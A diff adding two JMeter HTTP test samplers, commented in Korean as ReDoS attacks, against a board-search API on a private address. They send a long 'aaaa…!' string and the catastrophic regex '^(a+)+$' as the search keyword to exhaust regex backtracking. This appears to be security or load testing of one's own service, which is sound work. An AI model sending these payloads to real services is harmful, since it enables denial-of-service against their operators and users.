@@ -1,0 +1,63 @@
+<!-- ReDoS 공격 1: 중첩된 패턴 -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_redos_nested" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="keyword" elementType="HTTPArgument">
+        <!-- (a+)+$ 패턴을 악용한 입력 -->
+        <stringProp name="Argument.value">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</stringProp>
+        <stringProp name="Argument.name">keyword</stringProp>
+      </elementProp>
+      <elementProp name="sort" elementType="HTTPArgument">
+        <stringProp name="Argument.value">latest</stringProp>
+        <stringProp name="Argument.name">sort</stringProp>
+      </elementProp>
+      <elementProp name="page" elementType="HTTPArgument">
+        <stringProp name="Argument.value">0</stringProp>
+        <stringProp name="Argument.name">page</stringProp>
+      </elementProp>
+      <elementProp name="size" elementType="HTTPArgument">
+        <stringProp name="Argument.value">6</stringProp>
+        <stringProp name="Argument.name">size</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
+
+<!-- ReDoS 공격 2: PostgreSQL 정규식 연산자 악용 -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_redos_postgres_regex" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="keyword" elementType="HTTPArgument">
+        <!-- PostgreSQL 정규식: '^(a+)+$' 에 대한 악성 입력 -->
+        <stringProp name="Argument.value">^(a+)+$</stringProp>
+        <stringProp name="Argument.name">keyword</stringProp>
+      </elementProp>
+      <elementProp name="sort" elementType="HTTPArgument">
+        <stringProp name="Argument.value">latest</stringProp>
+        <stringProp name="Argument.name">sort</stringProp>
+      </elementProp>
+      <elementProp name="page" elementType="HTTPArgument">
+        <stringProp name="Argument.value">0</stringProp>
+        <stringProp name="Argument.name">page</stringProp>
+      </elementProp>
+      <elementProp name="size" elementType="HTTPArgument">
+        <stringProp name="Argument.value">6</stringProp>
+        <stringProp name="Argument.name">size</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
